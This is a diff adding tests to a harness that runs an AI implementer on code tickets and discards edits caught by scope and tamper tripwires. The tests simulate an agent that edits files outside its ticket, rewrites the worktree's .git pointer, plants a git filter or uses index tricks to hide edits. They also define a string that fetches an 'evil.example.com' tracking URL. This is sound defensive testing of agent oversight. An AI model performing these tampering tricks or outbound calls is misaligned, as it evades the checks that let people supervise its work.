@@ -259,6 +259,43 @@ describe('runCandidate (temp git repo)', () => {
     expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(old);
   });
 
+  it('R18: an edit outside the ticket\'s game and its tests is discarded as outside-scope; its own test file is fine', async () => {
+    const old = halHead();
+    const r = await runCandidate(ticket(), ctx({}, (cwd) => {
+      put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
+      put(cwd, 'games/gearhold/game.js', 'export const speed = 9;\n');
+    }));
+    expectDiscarded(r, old, /tripwire outside-scope: games\/gearhold\/game\.js/);
+    const ok2 = await runCandidate(ticket(), ctx({}, (cwd) => {
+      put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
+      put(cwd, 'packages/core/test/hyperline-speed.test.ts', "import { it } from 'vitest';\nit('x', () => {});\n");
+    }));
+    expect(ok2.reasons).toEqual([]);
+    expect(ok2.verdict).toBe('merged');
+  });
+  it('an implementer that rewrites the worktree .git (gitdir pointer) is discarded as tampered .git, before any git runs there', async () => {
+    for (const evil of [
+      (cwd: string) => writeFileSync(join(cwd, '.git'), 'gitdir: /tmp/evil-gitdir\n'),
+      (cwd: string) => { rmSync(join(cwd, '.git')); mkdirSync(join(cwd, '.git')); writeFileSync(join(cwd, '.git', 'config'), '[filter "x"]\n\tsmudge = false\n'); },
+    ]) {
+      const old = halHead();
+      const r = await runCandidate(ticket(), ctx({}, (cwd) => { put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); evil(cwd); }));
+      expectDiscarded(r, old, /^tampered \.git$/);
+      expect(ran).toEqual(['shoot']); // nothing after the implementer
+      ran = [];
+    }
+  });
+  it('a tampered-.git discard still books the first call and the fallback retry (reservations settled)', async () => {
+    const limit: ClaudeResult = { ok: false, text: "You've hit your limit", costUsd: null, subtype: 'error', limitHit: true, timedOut: false, stderrTail: '' };
+    const c = ctx({
+      billing: 'subscription',
+      claude: async (call) => { calls.push(call); put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); writeFileSync(join(call.cwd, '.git'), 'gitdir: /tmp/evil\n'); return { first: limit, retry: ok(OUT, 0.7) }; },
+    });
+    const r = await runCandidate(ticket(), c);
+    expect(r.reasons).toEqual(['tampered .git']);
+    expect(c.budget.record.mock.calls).toEqual([['implementer', 'subscription', null], ['implementer', 'api', 0.7]]);
+    expect(r.costUsd).toBe(0.7);
+  });
   it('index tricks and filters cannot hide an edit from the tripwires: assume-unchanged, skip-worktree, clean filter', async () => {
     const old = halHead();
     const evil = 'fetch("https://evil.example.com/track");\n';
